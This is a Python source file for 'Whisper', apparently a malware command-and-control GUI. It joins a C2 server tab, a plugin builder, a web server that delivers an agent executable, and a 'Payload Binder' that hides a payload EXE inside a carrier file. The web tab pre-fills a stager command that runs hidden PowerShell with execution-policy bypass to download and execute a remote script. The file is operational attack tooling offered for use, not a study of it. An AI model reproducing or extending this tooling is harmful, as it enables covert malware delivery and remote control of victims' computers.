"""Whisper - Unified C2 Server & Plugin Builder"""
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import threading, os, sys, json, base64, webbrowser, subprocess, time, datetime

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from server import MainApp as ServerApp, setup_styles, DARK_BG, DARKER_BG, DARKEST_BG, ACCENT, TEXT_FG, TEXT_SEC, GREEN, FONT, FONT_BOLD, FONT_SM
from builder import BuilderApp
import binder, web_server

VERSION = "2.0"

class UnifiedApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(f"Whisper v{VERSION}")
        self.root.geometry("1100x720")
        self.root.configure(bg=DARK_BG)
        self.root.minsize(900, 600)
        setup_styles()

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=3, pady=3)

        self._build_server_tab()
        self._build_builder_tab()
        self._build_web_tab()
        self._build_binder_tab()

        self._web_server = None
        self._web_thread = None
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        # Start server automatically
        self.root.after(500, self.server_tab._start_server)

    def _on_close(self):
        try: self.server_tab.engine.stop()
        except: pass
        try:
            if self._web_server:
                self._web_server.shutdown()
        except: pass
        self.root.destroy()

    def _make_tab(self, title):
        f = tk.Frame(self.notebook, bg=DARK_BG)
        self.notebook.add(f, text=title)
        return f

    def _build_server_tab(self):
        f = self._make_tab(" C2 Server ")
        self.server_tab = ServerApp(master=f)

    def _build_builder_tab(self):
        f = self._make_tab(" Plugin Builder ")
        self.builder_tab = BuilderApp(master=f)

    def _build_web_tab(self):
        f = self._make_tab(" Web Server ")
        self._web_build_ui(f)

    def _web_build_ui(self, f):
        top = tk.Frame(f, bg=DARK_BG)
        top.pack(fill="x", padx=10, pady=3)
        tk.Label(top, text="Web Delivery Server", bg=DARK_BG, fg=ACCENT, font=("Consolas", 14, "bold")).pack(side="left")

        cfg = tk.Frame(f, bg=DARK_BG)
        cfg.pack(fill="x", padx=10, pady=2)

        r1 = tk.Frame(cfg, bg=DARK_BG)
        r1.pack(fill="x", pady=1)
        tk.Label(r1, text="Port:", bg=DARK_BG, fg=TEXT_FG, font=FONT_SM, width=6, anchor="w").pack(side="left")
        self.web_port = tk.Entry(r1, bg=DARKER_BG, fg=TEXT_FG, font=FONT_SM, relief="flat", width=8)
        self.web_port.insert(0, "8080")
        self.web_port.pack(side="left")

        tk.Label(r1, text="  Agent:", bg=DARK_BG, fg=TEXT_FG, font=FONT_SM).pack(side="left", padx=(10,0))
        self.web_agent_path = tk.Entry(r1, bg=DARKER_BG, fg=TEXT_FG, font=FONT_SM, relief="flat")
        self.web_agent_path.pack(side="left", fill="x", expand=True, padx=4)
        ttk.Button(r1, text="Browse", command=self._web_browse_agent).pack(side="right")

        r2 = tk.Frame(cfg, bg=DARK_BG)
        r2.pack(fill="x", pady=3)
        self.web_status = tk.Label(r2, text="Stopped", bg=DARK_BG, fg=ACCENT, font=FONT_SM)
        self.web_status.pack(side="left")
        self.web_url_label = tk.Label(r2, text="", bg=DARK_BG, fg=GREEN, font=FONT_SM)
        self.web_url_label.pack(side="left", padx=8)
        ttk.Button(r2, text="Start", command=self._web_start).pack(side="right", padx=1)
        ttk.Button(r2, text="Stop", command=self._web_stop).pack(side="right", padx=1)
        ttk.Button(r2, text="Open", command=self._web_open).pack(side="right", padx=1)

        sep = ttk.Separator(f, orient="horizontal")
        sep.pack(fill="x", padx=10, pady=2)

        self.web_log = scrolledtext.ScrolledText(f, bg=DARKEST_BG, fg=GREEN, font=FONT_SM, relief="flat", state="disabled")
        self.web_log.pack(fill="both", expand=True, padx=10, pady=2)

        stg = tk.LabelFrame(f, text="Stager", bg=DARK_BG, fg=TEXT_SEC, font=FONT_SM)
        stg.pack(fill="x", padx=10, pady=3)
        self.stager_text = tk.Text(stg, bg=DARKER_BG, fg=TEXT_FG, font=("Consolas", 8), relief="flat", height=3)
        self.stager_text.insert("1.0", "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"iex(New-Object Net.WebClient).DownloadString('http://IP:PORT/stager.ps1')\"")
        self.stager_text.pack(fill="x", padx=5, pady=3)

    def _web_browse_agent(self):
        f = filedialog.askopenfilename(title="Select agent EXE", filetypes=[("EXE files","*.exe")])
        if f: self.web_agent_path.delete(0,"end"); self.web_agent_path.insert(0,f)

    def _web_log_msg(self, msg):
        self.web_log.configure(state="normal")
        self.web_log.insert("end", f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.web_log.see("end"); self.web_log.configure(state="disabled")

    def _web_start(self):
        port = int(self.web_port.get().strip())
        agent = self.web_agent_path.get().strip()
        if not os.path.isfile(agent): self._web_log_msg("[!] Select a valid agent EXE"); return
        try:
            self._web_server = web_server.ThreadedServer(("0.0.0.0", port), web_server.PayloadHandler)
        except Exception as e:
            self._web_log_msg(f"[!] Failed to start: {e}"); return
        self._web_thread = threading.Thread(target=self._web_server.serve_forever, daemon=True)
        self._web_thread.start()
        web_server.AGENT_FILE = agent
        self.web_status.config(text="Running", fg=GREEN)
        self.web_url_label.config(text=f"http://0.0.0.0:{port}")
        self._web_log_msg(f"[+] Web server started on port {port}")

    def _web_stop(self):
        try:
            if self._web_server:
                self._web_server.shutdown()
                self._web_server = None
        except: pass
        self.web_status.config(text="Stopped", fg=ACCENT)
        self.web_url_label.config(text="")
        self._web_log_msg("[*] Web server stopped")

    def _web_open(self):
        port = self.web_port.get().strip()
        webbrowser.open(f"http://127.0.0.1:{port}")

    def _build_binder_tab(self):
        f = self._make_tab(" Binder ")
        top = tk.Frame(f, bg=DARK_BG)
        top.pack(fill="x", padx=10, pady=3)
        tk.Label(top, text="Payload Binder", bg=DARK_BG, fg=ACCENT, font=("Consolas", 14, "bold")).pack(side="left")

        # File rows
        cf = tk.Frame(f, bg=DARK_BG)
        cf.pack(fill="x", padx=10, pady=2)

        def _row(lbl):
            fr = tk.Frame(cf, bg=DARK_BG)
            fr.pack(fill="x", pady=1)
            tk.Label(fr, text=lbl, bg=DARK_BG, fg=TEXT_FG, font=FONT_SM, width=14, anchor="w").pack(side="left")
            e = tk.Entry(fr, bg=DARKER_BG, fg=TEXT_FG, font=FONT_SM, relief="flat")
            e.pack(side="left", fill="x", expand=True, padx=4)
            return e

        self.bind_carrier = _row("Carrier File:")
        self.bind_payload = _row("Payload EXE:")
        self.bind_output = _row("Output File:")

        br = tk.Frame(cf, bg=DARK_BG)
        br.pack(fill="x", pady=2)
        ttk.Button(br, text="Browse Carrier", command=lambda: self._bind_browse("carrier")).pack(side="left", padx=1)
        ttk.Button(br, text="Browse Payload", command=lambda: self._bind_browse("payload")).pack(side="left", padx=1)
        ttk.Button(br, text="Browse Output", command=lambda: self._bind_browse("output")).pack(side="left", padx=1)

        self.bind_compile = tk.BooleanVar(value=True)
        tk.Checkbutton(f, text="Compile to EXE", variable=self.bind_compile,
            bg=DARK_BG, fg=TEXT_FG, selectcolor=DARKER_BG, font=FONT_SM).pack(anchor="w", padx=10)

        ttk.Button(f, text="Bind Files", command=self._bind_do).pack(pady=3)

        self.bind_log = scrolledtext.ScrolledText(f, bg=DARKEST_BG, fg=GREEN, font=FONT_SM, relief="flat", height=6, state="disabled")
        self.bind_log.pack(fill="both", expand=True, padx=10, pady=3)

    def _bind_browse(self, target):
        f = filedialog.askopenfilename()
        if not f: return
        if target == "carrier": self.bind_carrier.delete(0,"end"); self.bind_carrier.insert(0,f)
        elif target == "payload": self.bind_payload.delete(0,"end"); self.bind_payload.insert(0,f)
        elif target == "output": self.bind_output.delete(0,"end"); self.bind_output.insert(0,f)

    def _bind_log_msg(self, msg):
        self.bind_log.configure(state="normal")
        self.bind_log.insert("end", msg + "\n")
        self.bind_log.see("end"); self.bind_log.configure(state="disabled")

    def _bind_do(self):
        carrier = self.bind_carrier.get().strip()
        payload = self.bind_payload.get().strip()
        output = self.bind_output.get().strip()
        if not os.path.isfile(carrier): self._bind_log_msg("[!] Select carrier file"); return
        if not os.path.isfile(payload): self._bind_log_msg("[!] Select payload EXE"); return
        if not output: output = os.path.join(os.path.dirname(payload), f"bound_{os.path.basename(carrier)}.exe")
        compile_exe = self.bind_compile.get()
        self._bind_log_msg("[*] Binding...")
        def task():
            try:
                binder.bind(carrier, payload, output, compile_exe=compile_exe)
                self.root.after(0, self._bind_log_msg, f"[+] Bound file: {output}")
            except Exception as e:
                self.root.after(0, self._bind_log_msg, f"[!] Bind failed: {e}")
        threading.Thread(target=task, daemon=True).start()

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    UnifiedApp().run()
